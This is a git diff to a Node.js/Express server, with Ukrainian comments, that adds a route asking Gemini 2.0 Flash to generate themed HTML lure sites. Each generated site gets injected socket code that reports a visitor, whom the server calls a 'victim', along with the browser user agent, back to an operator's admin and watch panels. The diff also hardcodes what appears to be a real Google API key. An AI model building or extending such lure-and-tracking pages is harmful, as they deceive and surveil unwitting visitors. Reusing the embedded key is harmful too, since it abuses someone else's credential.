@@ -193,6 +193,57 @@ function parseDevice(ua) {
 }
 
 const PORT = 3000;
+// --- ДОДАТИ ПЕРЕД PORT = 3000 ---
+
+// Маршрут для генерації сайту через Gemini 2.0 Flash
+app.post('/generate-ai-page', async (req, res) => {
+    const { sessionId, prompt } = req.body;
+    const GEMINI_KEY = "AIzaSyB5bJTgHWd0zmsO95fESuaqzjTAeP-2oEE"; // Ваш ключ
+
+    if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });
+
+    try {
+        const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                contents: [{
+                    parts: [{
+                        text: `Створи професійний HTML/CSS сайт на тему: "${prompt}". 
+                        Вимоги: 
+                        1. Тільки один файл HTML зі стилями всередині <style>. 
+                        2. Додай у скрипт цей код: 
+                           const socket = io(); 
+                           socket.emit('join-room-victim', { roomId: '${sessionId}', userAgent: navigator.userAgent });
+                        3. Якщо в налаштуваннях сесії є звук "${sessions[sessionId].sound}", зроби кнопку або подію, яка його відтворить.
+                        4. Поверни ТІЛЬКИ чистий HTML код, без markdown (без \`\`\`html).`
+                    }]
+                }]
+            })
+        });
+
+        const data = await response.json();
+        const htmlCode = data.candidates[0].content.parts[0].text;
+
+        // Зберігаємо згенерований код у сесію
+        sessions[sessionId].customHTML = htmlCode;
+        
+        res.json({ success: true, url: `/cust.html/${sessionId}` });
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ error: 'AI generation failed' });
+    }
+});
+
+// Роут для видачі готового сайту (як ви просили: /cust.html/ID)
+app.get('/cust.html/:id', (req, res) => {
+    const session = sessions[req.params.id];
+    if (session && session.customHTML) {
+        res.send(session.customHTML);
+    } else {
+        res.status(404).send('Сайт не знайдено. Спробуйте згенерувати його в адмінці.');
+    }
+});
 http.listen(PORT, '0.0.0.0', () => {
     console.log(`Server running on http://localhost:${PORT}`);
     console.log(`Admin: /admin.html | Watch: /watch.html | Victim: /victim.html?id=...`);
